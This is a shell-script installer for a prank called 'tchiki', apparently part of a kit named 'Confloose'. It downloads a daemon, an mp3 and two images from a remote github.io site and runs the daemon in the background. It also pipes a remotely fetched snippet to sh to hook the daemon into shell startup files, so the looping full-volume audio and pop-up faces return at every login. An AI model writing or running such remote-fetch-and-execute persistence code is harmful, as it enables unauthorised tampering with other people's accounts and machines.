#!/bin/sh
# tchiki - loop tchiki.mp3 (volume 100%) and pop two faces in small random windows.

dir="${AFS_DIR:-$HOME}/.confloose/bin/tchiki"
file="$dir/confloose-tchiki"
base="${CONFLOOSE_BASE:-https://sayt-0.github.io/Confloose}"
mkdir -p "$dir"

# Any failed download: install nothing and exit non-zero so install.sh records nothing.
curl -fsSL "$base/confloose/tchiki/daemon.sh"  > "$file"          || { rm -rf "$dir"; exit 1; }
curl -fsSL "$base/confloose/tchiki/tchiki.mp3" > "$dir/tchiki.mp3" || { rm -rf "$dir"; exit 1; }
curl -fsSL "$base/confloose/tchiki/louis.jpg"  > "$dir/louis.jpg"  || { rm -rf "$dir"; exit 1; }
curl -fsSL "$base/confloose/tchiki/evan.jpg"   > "$dir/evan.jpg"   || { rm -rf "$dir"; exit 1; }
chmod +x "$file"

echo $(curl -fsSL "$base/confloose/bashrc_confloose_base.sh") "tchiki" "'\"$file\" 2>/dev/null 1>&2 &'" | sh
# Start now too; the daemon's lock makes a second start a no-op.
"$file" >/dev/null 2>&1 &
for name in bashrc zshrc; do [ -f "$HOME/.$name" ] && ( . "$HOME/.$name" ) 2>/dev/null; done; true
